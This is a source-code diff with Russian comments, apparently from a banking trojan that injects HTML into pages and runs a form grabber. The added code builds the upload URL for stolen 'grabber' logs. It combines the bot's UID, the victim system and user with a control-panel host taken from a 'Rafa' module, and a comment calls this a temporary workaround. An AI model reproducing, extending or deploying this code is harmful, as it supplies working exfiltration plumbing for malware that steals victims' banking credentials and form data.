@@ -4,6 +4,7 @@
 
 #include "Modules.h"
 #include "StrConsts.h"
+#include "BotHTTP.h"
 
 
 #ifdef AzConfigH
@@ -243,24 +244,43 @@ void AzInizializeHTMLInjects()
 
 
 //------------------------------------------------------
-//  GetAzGrabberURL - Функция возвращает адрес в админке
-//  AZ для отправки лога грабера
+//  GetAzGrabberURLPath Функция возвращает путь URL для
+//  отправки лога грабера
 //------------------------------------------------------
-
 // Строка определена в модуле StrConsts.cpp
 extern CSSTR EStrAzGrabberPathMask[];
 
-string GetAzGrabberURL(const string& SystemName,  const char* Action)
+string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
 {
 	string Mask = GetStr(EStrAzGrabberPathMask);
-	string URL;
+	if (STRA::IsEmpty(Action)) Action = "save_tf";
+	string Path;
+	Path.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
+	return Path;
+}
 
-	if (STRA::IsEmpty(Action))
-		Action = "save_tf";
 
-	URL.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
-	PCHAR Tmp = GetJavaScriptURL(URL.t_str());
-	URL = Tmp;
-	STR::Free(Tmp);
-    return URL;
+
+
+//------------------------------------------------------
+//  GetAzGrabberURL - Функция возвращает адрес в админке
+//  AZ для отправки лога грабера
+//------------------------------------------------------
+string GetAzGrabberURL(const string& SystemName,  const char* Action)
+{
+
+	string StrURL;
+
+	// Временны "КОСТЫЛЬ"
+	// Хосты аз берём из мдуля Rafa.h
+	// Связано с некорректно организацие системы плучения хостов
+	// для различных систем. В дальнешем все хсты админок аз
+	// должны быть сведены в этот модуль
+	#ifdef RafaH
+		TURL  URL;
+		URL.Host = Rafa::GetWorkHost();
+		URL.Path = GetAzGrabberURLPath(SystemName, Action);
+        StrURL = URL.URL();
+	#endif
+    return StrURL;
 }
